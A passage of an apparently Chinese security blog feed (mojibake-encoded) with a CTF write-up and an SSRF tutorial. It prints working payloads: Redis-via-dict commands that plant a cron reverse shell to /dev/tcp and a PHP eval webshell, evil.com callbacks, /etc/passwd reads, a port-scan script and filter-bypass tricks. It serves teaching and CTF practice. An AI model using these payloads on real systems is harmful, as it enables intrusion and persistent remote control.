scanner for thread objects</span><br><span class="line">                threads         Investigate _ETHREAD and _KTHREADs</span><br><span class="line">                timeliner       Creates a timeline from various artifacts in memory </span><br><span class="line">                timers          Print kernel timers and associated module DPCs</span><br><span class="line">                truecryptmaster Recover TrueCrypt 7.1a Master Keys</span><br><span class="line">                truecryptpassphrase     TrueCrypt Cached Passphrase Finder</span><br><span class="line">                truecryptsummary        TrueCrypt Summary</span><br><span class="line">                unloadedmodules Print list of unloaded modules</span><br><span class="line">                userassist      Print userassist registry keys and information</span><br><span class="line">                userhandles     Dump the USER handle tables</span><br><span class="line">                vaddump         Dumps out the vad sections to a file</span><br><span class="line">                vadinfo         Dump the VAD info</span><br><span class="line">                vadtree         Walk the VAD tree and display in tree format</span><br><span class="line">                vadwalk         Walk the VAD tree</span><br><span class="line">                vboxinfo        Dump virtualbox information</span><br><span class="line">                verinfo         Prints out the version information from PE images</span><br><span class="line">                vmwareinfo      Dump VMware VMSS/VMSN information</span><br><span class="line">                volshell        Shell in the memory image</span><br><span class="line">                windows         Print Desktop Windows (verbose details)</span><br><span class="line">                wintree         Print Z-Order Desktop Windows Tree</span><br><span class="line">                wndscan         Pool scanner for window stations</span><br><span class="line">                yarascan        Scan process or kernel memory with Yara signatures</span><br></pre></td></tr></table></figure></div>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;volatility&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#volatility&quot;&gt;#&lt;/a&gt; Volatility&lt;/h1&gt;
&lt;h2 id=&quot;å…ˆä»¥otterctfä¸ºä¾‹&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>SSRF</title>
    <link href="http://example.com/2024/04/22/SSRF/"/>
    <id>http://example.com/2024/04/22/SSRF/</id>
    <published>2024-04-22T13:56:10.000Z</published>
    <updated>2024-04-23T05:04:55.663Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ssrf"><a class="markdownIt-Anchor" href="#ssrf">#</a> SSRF</h1><h2 id="dasctf-x-gfctf-2024-easysignin"><a class="markdownIt-Anchor" href="#dasctf-x-gfctf-2024-easysignin">#</a> DASCTF X GFCTF 2024 | EasySignin</h2><p>é¦–å…ˆå¤ç°ä¸€é“æœ€è¿‘æ¯”èµ›é‡åˆ°çš„ä¸€é“é¢˜</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/22/IWw2RAmLtjMisFH.png" alt="image.png"></p><p>ç»å…¸ç™»é™†ç•Œé¢å¼€å±€ï¼Œå…ˆå°è¯• admin 123456ï¼Œå¯†ç é”™è¯¯ï¼Œæ³¨å†Œä¸€ä¸ª admin1 123456ï¼Œç™»ä¸Šå»ä¹‹åçœ‹å¥½åº·çš„ç…§ç‰‡ï¼Œä¸ç»™çœ‹ï¼Œæƒé™ä¸å¤Ÿï¼Œåº”è¯¥è¿˜æ˜¯éœ€è¦ç™»å½• adminï¼Œå‘ç°æœ‰ä¸€ä¸ªæ›´æ”¹å¯†ç çš„é€‰é¡¹ï¼Œå¯ä»¥åˆ©ç”¨ä¸€ä¸‹</p><p>è¿™é‡Œæœ‰ä¸¤ç§æ–¹å¼ï¼š</p><p>1. åˆ©ç”¨ sql æ³¨å…¥</p><p>æ³¨å†Œæ—¶ç”¨æˆ·åä¸º <code>admin&quot;#</code> åŒå¼•å·ä¼šé—­åˆå‰é¢çš„å¼•å·ï¼Œ# æ³¨é‡Šæ‰åé¢çš„å†…å®¹ï¼Œæ­¤æ—¶ç™»å½•ä¹‹åæ›´æ”¹å¯†ç å®é™…ä¼šæ›´æ”¹ <code>admin</code>  çš„å¯†ç ï¼Œåœ¨ç™»é™† admin å°±å¯ä»¥çœ‹äº†</p><p>2.burp æŠ“åŒ…</p><p>ä¿®æ”¹å¯†ç åˆ©ç”¨ bp æŠ“åŒ…</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/22/RuP9V7keCf3Kb8Y.png" alt="image.png"></p><p>å‘ç°ä¼šæ˜¾ç¤º usernameï¼Œä¸”è¿™é‡ŒæœªéªŒè¯ session ä¸­çš„ username å’Œè¾“å…¥çš„ username æ˜¯å¦ç›¸åŒï¼Œé‚£è¿™é‡Œå°±å­˜åœ¨é€»è¾‘æ¼æ´äº†ï¼Œå¯ä»¥å°è¯•å°† username èµ‹å€¼ä¸º adminï¼Œå³å¯ä»¥è¶Šæƒä¿®æ”¹ admin çš„å¯†ç ï¼Œä¿®æ”¹å¯†ç åä»¥ admin å¯†ç ç™»å½•ã€‚</p><p>ç™»å½•åˆ° admin ä¹‹åæŸ¥çœ‹å¥½åº·çš„ç…§ç‰‡</p><p><img lazyload src="/images/loading.svg" data-src="https://img2.imgtp.com/2024/04/22/1YukL6P4.png" alt="1713795160605.png"></p><p>å‘ç°ç›´æ¥æ˜¾ç¤ºäº†æ–‡ä»¶çš„åœ°å€ï¼Œä¸‹é¢å°±è¦ç”¨åˆ° SSRF çš„çŸ¥è¯†äº†ï¼Œæµ‹è¯•ä¸€ä¸‹ï¼Œè¿‡æ»¤æ‰äº† fileã€dict ç­‰å‡ ä¸ªåè®®ï¼Œä½†æ²¡è¿‡æ»¤ gopherï¼Œå¯ä»¥ç”¨å®ƒæ¢æµ‹æœåŠ¡å’Œç«¯å£ï¼Œæ¢æµ‹åˆ° 3306 ç«¯å£å¼€æ”¾äº† mysql æœåŠ¡ï¼Œè¿™é‡Œ root çš„å¯†ç ä¸ºç©ºï¼Œäºæ˜¯æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ gopher åè®®å»æ”»å‡» mysqlã€‚</p><p>ç›´æ¥åˆ©ç”¨ Gopherus æŸ¥çœ‹æ ¹ç›®å½•ä¸‹çš„ flag æ–‡ä»¶</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/22/Fpa2BKjsRrZeNw8.png" alt="image.png"></p><p>äºŒæ¬¡ url ç¼–ç ï¼Œbp æŠ“åŒ…</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/22/DNrAxPlFmZ58GHu.png" alt="image.png"></p><p>base64 è§£ç å¾—åˆ° flagï¼š <code>DASCTF&#123;39302405-b602-4b99-8101-66cd65424bbe&#125;</code></p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/22/kgFEKOrs6Q7NxWP.png" alt="image.png"></p><h2 id="ssrf-2"><a class="markdownIt-Anchor" href="#ssrf-2">#</a> SSRF</h2><h3 id="ssrfæ˜¯ä»€ä¹ˆ"><a class="markdownIt-Anchor" href="#ssrfæ˜¯ä»€ä¹ˆ">#</a> SSRF æ˜¯ä»€ä¹ˆï¼Ÿ</h3><p>SSRF (Server-Side Request Forgery: æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ) æ˜¯ä¸€ç§ç”±æ”»å‡»è€…æ„é€ å½¢æˆç”±<strong>æœåŠ¡ç«¯</strong>å‘èµ·è¯·æ±‚çš„ä¸€ä¸ªå®‰å…¨æ¼æ´ã€‚</p><p>ç”±äºå­˜åœ¨é˜²ç«å¢™çš„é˜²æŠ¤ï¼Œå¯¼è‡´æ”»å‡»è€…æ— æ³•ç›´æ¥å…¥ä¾µå†…ç½‘ï¼›è¿™æ—¶æ”»å‡»è€…å¯ä»¥ä»¥æœåŠ¡å™¨ä¸ºè·³æ¿å‘èµ·ä¸€äº›ç½‘ç»œè¯·æ±‚ï¼Œä»è€Œæ”»å‡»å†…ç½‘çš„åº”ç”¨åŠè·å–å†…ç½‘æ•°æ®ã€‚</p><p>ä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒSSRF æ”»å‡»çš„ç›®æ ‡æ˜¯<strong>ä»å¤–ç½‘æ— æ³•è®¿é—®çš„å†…éƒ¨ç³»ç»Ÿ</strong>ã€‚ï¼ˆæ­£æ˜¯å› ä¸ºå®ƒæ˜¯ç”±æœåŠ¡ç«¯å‘èµ·çš„ï¼Œæ‰€ä»¥å®ƒèƒ½å¤Ÿè¯·æ±‚åˆ°ä¸å®ƒç›¸è¿è€Œä¸å¤–ç½‘éš”ç¦»çš„å†…éƒ¨ç³»ç»Ÿï¼‰</p><p>SSRF å½¢æˆçš„åŸå› å¤§éƒ½æ˜¯ç”±äºæœåŠ¡ç«¯æä¾›äº†ä»å…¶ä»–æœåŠ¡å™¨åº”ç”¨è·å–æ•°æ®çš„åŠŸèƒ½ä¸”æ²¡æœ‰å¯¹ç›®æ ‡åœ°å€åšè¿‡æ»¤ä¸é™åˆ¶ã€‚</p><p>æ¯”å¦‚ï¼Œé»‘å®¢æ“ä½œæœåŠ¡ç«¯ä»æŒ‡å®š URL åœ°å€è·å–ç½‘é¡µæ–‡æœ¬å†…å®¹ï¼ŒåŠ è½½æŒ‡å®šåœ°å€çš„å›¾ç‰‡ï¼Œä¸‹è½½ç­‰ç­‰ã€‚åˆ©ç”¨çš„æ˜¯æœåŠ¡ç«¯çš„è¯·æ±‚ä¼ªé€ ã€‚ssrf æ˜¯åˆ©ç”¨å­˜åœ¨ç¼ºé™·çš„ web åº”ç”¨ä½œä¸ºä»£ç†æ”»å‡»è¿œç¨‹å’Œæœ¬åœ°çš„æœåŠ¡å™¨</p><h3 id="ssrfä¸csrfçš„åŒºåˆ«"><a class="markdownIt-Anchor" href="#ssrfä¸csrfçš„åŒºåˆ«">#</a> SSRF ä¸ CSRF çš„åŒºåˆ«</h3><p>â€‹    CSRF æ˜¯æœåŠ¡å™¨ç«¯æ²¡æœ‰å¯¹ç”¨æˆ·æäº¤çš„æ•°æ®è¿›è¡Œéšæœºå€¼æ ¡éªŒï¼Œä¸”å¯¹ http è¯·æ±‚åŒ…å†…çš„ refer å­—æ®µæ ¡éªŒä¸ä¸¥ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥åˆ©ç”¨ç”¨æˆ·çš„ cookie ä¿¡æ¯ä¼ªé€ ç”¨æˆ·è¯·æ±‚å‘é€è‡³æœåŠ¡å™¨ï¼›</p><p>â€‹    SSRF æ˜¯æœåŠ¡å™¨å¯¹ç”¨æˆ·æä¾›çš„å¯æ§ URL è¿‡äºä¿¡ä»»ï¼Œæ²¡æœ‰å¯¹æ”»å‡»è€…æä¾›çš„ URL è¿›è¡Œåœ°å€é™åˆ¶å’Œè¶³å¤Ÿçš„æ£€æµ‹ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥ä»¥æ­¤ä¸ºè·³æ¿æ”»å‡»å†…ç½‘æˆ–è€…å…¶å®ƒæœåŠ¡å™¨ã€‚</p><h3 id="ssrfä¸­urlçš„ä¼ªåè®®"><a class="markdownIt-Anchor" href="#ssrfä¸­urlçš„ä¼ªåè®®">#</a> SSRF ä¸­ URL çš„ä¼ªåè®®</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">file:/// ä»æ–‡ä»¶ç³»ç»Ÿä¸­è·å–æ–‡ä»¶å†…å®¹ï¼Œå¦‚:file:///etc/passwd</span><br><span class="line">dict:// å­—å…¸æœåŠ¡å™¨åè®®ï¼Œè®¿é—®å­—å…¸èµ„æºï¼Œå¦‚:dict:///ip:6739/infoï¼š</span><br><span class="line">sftp:// SSHæ–‡ä»¶ä¼ è¾“åè®®æˆ–å®‰å…¨æ–‡ä»¶ä¼ è¾“åè®®</span><br><span class="line">ldap:// è½»é‡çº§ç›®å½•è®¿é—®åè®®</span><br><span class="line">tftp:// ç®€å•æ–‡ä»¶ä¼ è¾“åè®®</span><br><span class="line">gopher:// åˆ†å¸ƒå¼æ–‡æ¡£ä¼ é€’æœåŠ¡ï¼Œå¯ä½¿ç”¨gopherusç”Ÿæˆpayload</span><br></pre></td></tr></table></figure></div><h4 id="1-file"><a class="markdownIt-Anchor" href="#1-file">#</a> 1ã€file</h4><p>è¿™ç§ URL Schema å¯ä»¥å°è¯•ä»ç³»ç»Ÿæ–‡ä»¶ä¸­è·å–æ–‡ä»¶</p><p><code>file://æ–‡ä»¶çš„ç»å¯¹è·¯å¾„</code></p><blockquote><p><code>http://example.com/ssrf.php?url=file:///etc/passwd</code></p><p><code>http://example.com/ssrf.php?url=file:///C:/Windows/win.ini</code></p></blockquote><h4 id="2-dict"><a class="markdownIt-Anchor" href="#2-dict">#</a> 2ã€dict</h4><p>dict åè®®ä¸€èˆ¬å¸¸ç”¨æ¥æ¢æµ‹å†…ç½‘ä¸»æœºä»¥åŠç«¯å£å¼€æ”¾æƒ…å†µï¼Œæ—¢ç„¶èƒ½å¤Ÿæ¢æµ‹ç«¯å£ï¼Œé‚£ä¹ˆå¯ä»¥æ¢æµ‹ä¸åŒç«¯å£å¯¹åº”çš„æœåŠ¡çš„æŒ‡çº¹ä¿¡æ¯ã€‚å½“ç„¶ dict åè®®ä¹Ÿå¯ä»¥ç”¨æ¥æ‰§è¡Œä¸€äº›æœåŠ¡çš„å‘½ä»¤ï¼Œå¦‚ redis</p><ul><li>å†…ç½‘ä¸»æœºæ¢æµ‹</li><li>å¼€æ”¾ç«¯å£æ¢æµ‹</li><li>ç«¯å£æœåŠ¡æŒ‡çº¹æ¢æµ‹</li><li>æ‰§è¡Œå‘½ä»¤</li></ul><p><code>ditc://ip:port</code></p><p><code>ditc://ip:port/å‘½ä»¤</code></p><p>è¿™ç§ URL Scheme èƒ½å¤Ÿå¼•ç”¨å…è®¸é€šè¿‡ DICT åè®®ä½¿ç”¨çš„å®šä¹‰æˆ–å•è¯åˆ—è¡¨ï¼š</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssrf.php?dict://evil.com:1337/</span><br><span class="line">evil.com:$ nc -lvp 1337</span><br><span class="line">Connection from [192.168.0.12] port 1337[tcp/*]</span><br><span class="line">accepted (family 2, sport 31126)CLIENT libcurl 7.40.0</span><br></pre></td></tr></table></figure></div><h4 id="3-sftp"><a class="markdownIt-Anchor" href="#3-sftp">#</a> 3ã€sftp</h4><p>åœ¨è¿™é‡Œï¼ŒSftp ä»£è¡¨ SSH æ–‡ä»¶ä¼ è¾“åè®®ï¼ˆSSH File Transfer Protocolï¼‰ï¼Œæˆ–å®‰å…¨æ–‡ä»¶ä¼ è¾“åè®®ï¼ˆSecure File Transfer Protocolï¼‰ï¼Œè¿™æ˜¯ä¸€ç§ä¸ SSH æ‰“åŒ…åœ¨ä¸€èµ·çš„å•ç‹¬åè®®ï¼Œå®ƒè¿è¡Œåœ¨å®‰å…¨è¿æ¥ä¸Šï¼Œå¹¶ä»¥ç±»ä¼¼çš„æ–¹å¼è¿›è¡Œå·¥ä½œã€‚</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">ä¸€ã€dictåè®®æ¢æµ‹ç«¯å£å’ŒæœåŠ¡æŒ‡çº¹</span><br><span class="line">dict://127.0.0.1:22</span><br><span class="line">dict://172.22.10.10:3306</span><br><span class="line">dict://127.0.0.1:6379/info</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">äºŒã€dictåè®®æ”»å‡»redisï¼Œå†™å…¥å®šæ—¶ä»»åŠ¡ï¼Œè¿›è¡Œåå¼¹shell</span><br><span class="line">centosç³»ç»Ÿå®šæ—¶ä»»åŠ¡çš„è·¯å¾„ä¸ºï¼š/var/spool/cron</span><br><span class="line">debianç³»ç»Ÿå®šæ—¶ä»»åŠ¡çš„è·¯å¾„ä¸ºï¼š/var/spool/cron/crontabs</span><br><span class="line"> </span><br><span class="line">dict://127.0.0.1:6379/config:set:dbfilename:root</span><br><span class="line">dict://127.0.0.1:6379/config:set:dir:/var/spool/cron</span><br><span class="line">dict://127.0.0.1:6379/set:test:&quot;\n\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/10.10.10.10/1234 0&gt;&amp;1\n\n&quot;</span><br><span class="line">dict://127.0.0.1:6379/save</span><br><span class="line"> </span><br><span class="line">æ³¨æ„ï¼šè‹¥payloadå­˜åœ¨è¢«è½¬ä¹‰æˆ–è¿‡æ»¤çš„æƒ…å†µï¼Œå¯åˆ©ç”¨16è¿›åˆ¶å†™å…¥å†…å®¹</span><br><span class="line">dict://127.0.0.1:6379/set:test:&quot;\n\n\x2a/1\x20\x2a\x20\x2a\x20\x2a\x20\x2a\x20/bin/bash\x20\x2di\x20\x3e\x26\x20/dev/tcp/10.10.10.10/1234\x200\x3e\x261\n\n&quot;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">ä¸‰ã€dictåè®®æ”»å‡»redisï¼Œå†™å…¥webshell</span><br><span class="line">dict://127.0.0.1:6379/config:set:dbfilename:test.php</span><br><span class="line">dict://127.0.0.1:6379/config:set:dir:/var/www/html</span><br><span class="line">dict://127.0.0.1:6379/set:test:&quot;\n\n&lt;?php @eval($_POST[x]);?&gt;\n\n&quot;</span><br><span class="line">dict://127.0.0.1:6379/save</span><br><span class="line"> </span><br><span class="line">è‹¥å­˜åœ¨è¿‡æ»¤ï¼Œ åˆ™åˆ©ç”¨16è¿›åˆ¶å†…å®¹å†™å…¥ï¼š</span><br><span class="line">dict://127.0.0.1:6379/set:test:&quot;\n\n\x3c\x3f\x70\x68\x70\x20\x40\x65\x76\x61\x6c\x28\x24\x5f\x50\x4f\x53\x54\x5b\x78\x5d\x29\x3b\x3f\x3e\n\n&quot;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">å››ã€dictåè®®æ”»å‡»redisï¼Œå†™å…¥sshå…¬é’¥</span><br><span class="line">æ“ä½œå’Œå†™å…¥å®šæ—¶ä»»åŠ¡ç›¸ä¼¼</span><br></pre></td></tr></table></figure></div><h4 id="4-gopheråè®®"><a class="markdownIt-Anchor" href="#4-gopheråè®®">#</a> 4ã€gopher åè®®</h4><p>ä¸Šé¢å®˜æ–¹çš„è¯´æ˜äº†ä¸€ä¸‹ gopher åè®®ä»‹ç»ï¼Œå…·ä½“å¦‚ä½•åœ¨ ssrf ä¸­ä½¿ç”¨å‘¢ï¼Ÿ</p><p>gopher åè®®åœ¨ ssrf çš„åˆ©ç”¨ä¸­ä¸€èˆ¬ç”¨æ¥æ”»å‡» redisï¼Œmysqlï¼Œfastcgiï¼Œsmtp ç­‰æœåŠ¡ã€‚</p><p>gopher åè®®æ•°æ®æ ¼å¼ï¼š</p><p><code>gopher://ip:port/_TCP/IPæ•°æ®æµ</code></p><p>æ³¨æ„ï¼š</p><blockquote><p>1.gopher åè®®æ•°æ®æµä¸­ï¼Œurl ç¼–ç ä½¿ç”¨ %0d%0a æ›¿æ¢å­—ç¬¦ä¸²ä¸­çš„å›è½¦æ¢è¡Œ<br> 2. æ•°æ®æµæœ«å°¾ä½¿ç”¨ %0d%0a ä»£è¡¨æ¶ˆæ¯ç»“æŸ</p></blockquote><h4 id="5-ldapæˆ–ldaps-æˆ–ldapi"><a class="markdownIt-Anchor" href="#5-ldapæˆ–ldaps-æˆ–ldapi">#</a> 5ã€ldap:// æˆ– ldaps:// æˆ– ldapi://</h4><p>LDAP ä»£è¡¨è½»é‡çº§ç›®å½•è®¿é—®åè®®ã€‚å®ƒæ˜¯ IP ç½‘ç»œä¸Šçš„ä¸€ç§ç”¨äºç®¡ç†å’Œè®¿é—®åˆ†å¸ƒå¼ç›®å½•ä¿¡æ¯æœåŠ¡çš„åº”ç”¨ç¨‹åºåè®®ã€‚</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssrf.php?url=ldap://localhost:1337/%0astats%0aquit</span><br><span class="line">http://example.com/ssrf.php?url=ldaps://localhost:1337/%0astats%0aquit</span><br><span class="line">http://example.com/ssrf.php?url=ldapi://localhost:1337/%0astats%0aquit</span><br></pre></td></tr></table></figure></div><h4 id="6-tftp"><a class="markdownIt-Anchor" href="#6-tftp">#</a> 6ã€tftp://</h4><p>TFTPï¼ˆTrivial File Transfer Protocol, ç®€å•æ–‡ä»¶ä¼ è¾“åè®®ï¼‰æ˜¯ä¸€ç§ç®€å•çš„åŸºäº lockstep æœºåˆ¶çš„æ–‡ä»¶ä¼ è¾“åè®®ï¼Œå®ƒå…è®¸å®¢æˆ·ç«¯ä»è¿œç¨‹ä¸»æœºè·å–æ–‡ä»¶æˆ–å°†æ–‡ä»¶ä¸Šä¼ è‡³è¿œç¨‹ä¸»æœºã€‚</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssrf.php?url=tftp://evil.com:1337/TESTUDPPACKET</span><br><span class="line">evil.com:# nc -lvup 1337</span><br><span class="line">Listening on [0.0.0.0] (family 0, port1337)TESTUDPPACKEToctettsize0blksize512timeout3</span><br></pre></td></tr></table></figure></div><h3 id="æ¢æµ‹å†…ç½‘"><a class="markdownIt-Anchor" href="#æ¢æµ‹å†…ç½‘">#</a> æ¢æµ‹å†…ç½‘</h3><p>ssrf æœ€å¸¸è§çš„å°±æ˜¯æ¢æµ‹å†…ç½‘ï¼Œå¦‚æœæ‰¾åˆ°äº†å†…ç½‘ IP çš„ç½‘æ®µï¼Œå¯ä»¥å°è¯•ç”¨æš´åŠ›ç ´è§£å»æ¢æµ‹å†…ç½‘çš„ IPï¼Œä¸‹é¢ç»™å‡ºå‡ ç§å¸¸è§çš„æ¢æµ‹æ–¹æ³•ã€‚</p><ul><li>è„šæœ¬</li></ul><p>è¿™é‡Œè´´ä¸€ä¸ªé€šç”¨çš„ python è„šæœ¬</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">ports = [<span class="string">&#x27;80&#x27;</span>,<span class="string">&#x27;6379&#x27;</span>,<span class="string">&#x27;3306&#x27;</span>,<span class="string">&#x27;8080&#x27;</span>,<span class="string">&#x27;8000&#x27;</span>]</span><br><span class="line">session = requests.Session();</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">255</span>):</span><br><span class="line"> ip = <span class="string">&#x27;192.168.0.%d&#x27;</span> % i <span class="comment">#å†…ç½‘ipåœ°å€</span></span><br><span class="line"> <span class="keyword">for</span> port <span class="keyword">in</span> ports:</span><br><span class="line">  url = <span class="string">&#x27;http://ip/?url=http://%s:%s&#x27;</span> %(ip,port)</span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">   res = session.get(url,timeout=<span class="number">3</span>)</span><br><span class="line">   <span class="keyword">if</span> <span class="built_in">len</span>(res.text) != <span class="number">0</span> :    <span class="comment">#è¿™é‡Œé•¿åº¦æ ¹æ®å®é™…æƒ…å†µæ”¹</span></span><br><span class="line">    <span class="built_in">print</span>(ip,port,<span class="string">&#x27;is open&#x27;</span>)</span><br><span class="line">  <span class="keyword">except</span>:</span><br><span class="line">   <span class="keyword">continue</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Done&#x27;</span>)</span><br></pre></td></tr></table></figure></div><p>è¿™é‡Œå†™çš„æ˜¯çˆ†ç ´æŒ‡å®šçš„ä¸€äº›ç«¯å£å’Œ IP çš„ D æ®µï¼Œæ³¨æ„çš„æ˜¯æœ‰äº›é¢˜ç›®ä¼šç»™å‡ºç«¯å£çš„èŒƒå›´ï¼Œå°±å¯ä»¥æŠŠ ports æ”¹ä¸º <code>range()</code>  æŒ‡å®šä¸ºä¸€å®šçš„èŒƒå›´ï¼Œç„¶åè¿”å›çš„é•¿åº¦ <code>len(res.text)</code>  è¦å…ˆè‡ªå·±æµ‹ä¸€ä¸‹ã€‚</p><ul><li>burpsuite</li></ul><p>å¯ä»¥é€‰æ‹©ç”¨ burpsuite è½¯ä»¶ä¸­ Intruder å»çˆ†ç ´</p><ul><li>nmap å·¥å…·</li></ul><p>æ‰«æç›®æ ‡å¼€æ”¾ç«¯å£ï¼Œç›´æ¥ç”¨ nmap ä¸€æŠŠæ¢­ã€‚</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV ip</span><br><span class="line">nmap -sV ip -p6379 //æŒ‡å®š6379ç«¯å£æ‰«æ</span><br></pre></td></tr></table></figure></div><h3 id="bypass"><a class="markdownIt-Anchor" href="#bypass">#</a> Bypass</h3><p>ç»å¸¸ä¼šæœ‰é¢˜ç›® ban æ‰ 127.0.0.1 è¿™ä¸ªç½‘å€ï¼Œéœ€è¦è¿›è¡Œç»•è¿‡</p><h4 id="xipio"><a class="markdownIt-Anchor" href="#xipio">#</a> <a class="link" href="http://xip.io">xip.io <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h4><p>æœ‰ä¸€ä¸ªç½‘ç«™åœ°å€æ˜¯ï¼š<a class="link" href="http://xip.io">xip.io <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>ï¼Œå½“è®¿é—®è¿™ä¸ªæœåŠ¡çš„ä»»æ„å­åŸŸåçš„æ—¶å€™ï¼Œéƒ½ä¼šé‡å®šå‘åˆ°è¿™ä¸ªå­åŸŸåï¼Œä¸¾ä¸ªä¾‹å­ï¼š</p><p>å½“æˆ‘ä»¬è®¿é—®ï¼š <code>http://127.0.0.1.xip.io/1.php</code> ï¼Œå®é™…ä¸Šè®¿é—®çš„æ˜¯ <code>http://127.0.0.1/1.php</code> ã€‚</p><p><a class="link" href="http://xn--nip-ve1en80a0uy063a0hj9o1bga.io">åƒè¿™ç§ç½‘å€è¿˜æœ‰ nip.io <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>ï¼Œ<a class="link" href="http://sslip.io">sslip.io <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>ã€‚</p><p>å¦‚æœ php åç«¯åªæ˜¯ç”¨ parse_url å‡½æ•°ä¸­çš„ host å‚æ•°åˆ¤æ–­æ˜¯å¦ç­‰äº 127.0.0.1ï¼Œå°±å¯ä»¥ç”¨è¿™ç§æ–¹æ³•ç»•è¿‡ï¼Œä½†æ˜¯å¦‚æœæ˜¯æ£€æŸ¥æ˜¯å¦å­˜åœ¨å…³é”®å­— 127.0.0.1ï¼Œè¿™ç§æ–¹æ³•å°±ä¸å¯è¡Œäº†</p><h4 id="çŸ­åœ°å€ç»•è¿‡"><a class="markdownIt-Anchor" href="#çŸ­åœ°å€ç»•è¿‡">#</a> çŸ­åœ°å€ç»•è¿‡</h4><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/23/Pjbm4EWVKTFqkgp.png" alt="image.png"></p><p>æ­¤æ—¶ç›´æ¥ç”¨ <code>http://z6b.cn/yPqiU</code>  å°±ä¼š 302 è·³è½¬ç»•è¿‡ WAF</p><h4 id="è¿›åˆ¶è½¬æ¢"><a class="markdownIt-Anchor" href="#è¿›åˆ¶è½¬æ¢">#</a> è¿›åˆ¶è½¬æ¢</h4><p>å¯ä»¥ä½¿ç”¨ä¸€äº›ä¸åŒçš„è¿›åˆ¶æ›¿ä»£ ip åœ°å€ï¼Œä»è€Œç»•è¿‡ WAFï¼Œ</p><p>è´´ä¸€ä¸ªè¿›åˆ¶è½¬æ¢çš„ php è„šæœ¬</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$ip</span> = <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line"><span class="variable">$ip</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>,<span class="variable">$ip</span>);</span><br><span class="line"><span 